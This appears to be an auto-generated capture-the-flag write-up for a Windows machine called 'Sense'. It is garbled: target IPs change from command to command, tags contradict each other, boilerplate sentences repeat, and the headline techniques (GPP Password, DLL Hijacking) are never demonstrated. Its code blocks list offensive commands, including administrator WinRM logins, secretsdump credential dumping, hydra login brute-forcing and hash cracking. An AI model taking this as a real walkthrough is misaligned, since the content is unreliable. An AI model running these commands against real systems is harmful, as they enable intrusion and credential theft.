---
TitleSEO: "PwnTillDawn — Sense (Hard Windows) | ZureFX"
TitlePost: "PwnTillDawn — Sense (Hard Windows)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Sense. GPP Password and DLL Hijacking to achieve hard compromise on Windows."
Keywords: "hard, windows, active directory, linux, hackthebox, easy"
URL: "https://zurefx.github.io/writeups/htb-sense-446.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-sense-446/"
Date: "2025-05-23"
Tags: "Hard, Windows, Active Directory, Linux, HackTheBox, Easy"
Section: "writeups"
Lang: "en"
main_img: "htb-sense-446"
Permalink: "/writeups/htb-sense-446.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Sense** is rated **Hard** on PwnTillDawn. It runs **Windows** and the IP address during this analysis was `10.106.236.76`.

### Objectives

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
evil-winrm -i 10.76.24.96 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p995,8888,3389 10.44.152.167 -oN scan.txt
```

The backup files contained sensitive information that should not have been accessible. Network traffic analysis revealed unencrypted communications containing user credentials.

### Service Enumeration

Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality.

```bash
nmap -sCV -p9200,1433,8443 10.65.65.206 -oN scan.txt
evil-winrm -i 10.35.223.228 -u administrator -p 'P@ssw0rd!'
```

Network traffic analysis revealed unencrypted communications containing user credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

### SMB Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service.

```bash
gobuster dir -u http://10.116.33.59/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.65.173.182
evil-winrm -i 10.93.143.175 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Privilege escalation was possible due to misconfigured sudo permissions. Weak file permissions allowed modification of critical system files.

## Exploitation

### Vulnerability Identification

Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory. Command injection was possible through unsanitized user input in the search functionality.

Key finding: **GPP Password**.

The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine.

### Initial Access

Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
crackmapexec smb 10.108.100.153 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p23,25,8080 10.80.111.116 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.102.16.65 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.44.7.225 -u administrator -p 'P@ssw0rd!'
```

The backup files contained sensitive information that should not have been accessible. The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials.

## Privilege Escalation

### Enumeration

Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.54.92.222 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.53.243.93 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
```

### Exploitation

The service account had excessive permissions assigned in Active Directory. The web application was vulnerable to Server-Side Template Injection (SSTI).

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.104.105.150/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.82.159.209 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p22,636,443 10.89.70.81 -oN scan.txt
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The database credentials were hardcoded in the application source code. Group Policy Preferences contained encrypted but recoverable credentials.

## Summary

### Tools Used

- `burpsuite`
- `nmap`
- `rubeus`
- `rpcclient`
- `wpscan`
- `mimikatz`

### Key Takeaways

- GPP Password
- DLL Hijacking
